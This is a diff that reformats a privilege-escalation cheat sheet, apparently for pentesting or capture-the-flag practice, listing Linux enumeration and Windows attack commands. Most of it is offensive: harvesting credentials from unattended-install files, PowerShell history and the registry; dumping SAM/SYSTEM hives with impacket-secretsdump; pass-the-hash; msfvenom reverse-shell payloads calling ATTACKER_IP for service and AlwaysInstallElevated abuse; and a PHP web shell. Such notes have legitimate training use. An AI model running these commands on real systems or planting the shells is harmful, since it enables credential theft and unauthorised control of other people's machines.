@@ -120,68 +120,68 @@ world-writable files: /tmp, /dev/shm,/var/lock, /run/lock
 `find / -writable 2>/dev/null`  
 `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`  
 find world executable folders:  
-find / -perm -o x -type d 2>/dev/null
-#dev tools and supported languages
-find / -name perl* 2>/dev/null (gcc, python)
-strings BINARY
-export PATH=$PATH:/place/with/the/file
-getcap -r / 2>/dev/null (check for capabilities on binaries)
-cat /etc/crontab
-cat /etc/exports (NFS configuration)
-showmount -e IP_ADDRESS
+`find / -perm -o x -type d 2>/dev/null`  
+dev tools and supported languages  
+`find / -name perl* 2>/dev/null` (gcc, python)  
+`strings BINARY`  
+`export PATH=$PATH:/place/with/the/file`  
+`getcap -r / 2>/dev/null` (check for capabilities on binaries)  
+`cat /etc/crontab`  
+`cat /etc/exports` (NFS configuration)  
+`showmount -e IP_ADDRESS`  
 
 
-#Windows
-#Priv2Admin
+### Windows
+Priv2Admin  
 https://github.com/gtworek/Priv2Admin
 
-Leftover credentials from unattended installations: 
-C:\Unattend.xml 
-C:\Windows\Panther\Unattend.xml 
-C:\Windows\Panther\Unattend\Unattend.xml 
-C:\Windows\system32\sysprep.inf 
-C:\Windows\system32\sysprep\sysprep.xml
+Leftover credentials from unattended installations:   
+`C:\Unattend.xml`  
+`C:\Windows\Panther\Unattend.xml`  
+`C:\Windows\Panther\Unattend\Unattend.xml`  
+`C:\Windows\system32\sysprep.inf`  
+`C:\Windows\system32\sysprep\sysprep.xml`  
 
-Retrieve password history from cmd.exe:
-type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-Powershell:
-type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+Retrieve password history from cmd.exe:  
+type `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`  
+Powershell:  
+`type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`  
 
-View saved credentials:
-cmdkey /list
-( to use creds )
-runas /savecred /user:admin cmd.exe
-Search registry for passwords:
-reg query HKLM /f password /t REG_SZ /s
+View saved credentials:  
+`cmdkey /list`  
+( to use creds )  
+`runas /savecred /user:admin cmd.exe`  
+Search registry for passwords:  
+`reg query HKLM /f password /t REG_SZ /s`  
 
-Generate malicious exe:
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
-Change path to malicious .exe on configurable service:
-sc config SERVICE_NAME binPath= "C:\PATH_TO_MALICIOUS_EXE" obj= ACCOUNT
+Generate malicious exe:  
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`  
+Change path to malicious .exe on configurable service:  
+`sc config SERVICE_NAME binPath= "C:\PATH_TO_MALICIOUS_EXE" obj= ACCOUNT`  
 
-If SeBackup Privilege:
-reg save hklm\system OUTFILE.hive
-reg save hklm\sam OUTFILE.hive
-Copy to impacket-smbserver:
-impacket-smbserver -smb2support -username USER -password PASSWORD SHARENAME DIRECTORY 
-impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+If SeBackup Privilege:  
+`reg save hklm\system OUTFILE.hive`  
+`reg save hklm\sam OUTFILE.hive`  
+Copy to impacket-smbserver:  
+`impacket-smbserver -smb2support -username USER -password PASSWORD SHARENAME DIRECTORY`  
+`impacket-secretsdump -sam sam.hive -system system.hive LOCAL`  
 
-Pass the hash:
-impacket-psexec -hashes HASH USER@IP_ADDRESS
-pth-winexe -U 'username%hash' //MACHINE_IP cmd.exe
+Pass the hash:  
+`impacket-psexec -hashes HASH USER@IP_ADDRESS`  
+`pth-winexe -U 'username%hash' //MACHINE_IP cmd.exe`  
 
-Check Autorun:
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+Check Autorun:  
+`reg query`   `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`  
 
-AlwaysInstallElevated:
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_ADDRESS LPORT=53 -f msi -o reverse.msi
-msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+AlwaysInstallElevated:  
+`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`  
+`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`  
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_ADDRESS LPORT=53 -f msi -o reverse.msi`  
+`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`  
 
 
 
-RCE
-#PHP
-<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
-( execute using URL/uploads/shell.php?cmd= )
+### RCE
+PHP  
+`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`  
+( execute using URL/uploads/shell.php?cmd= )  
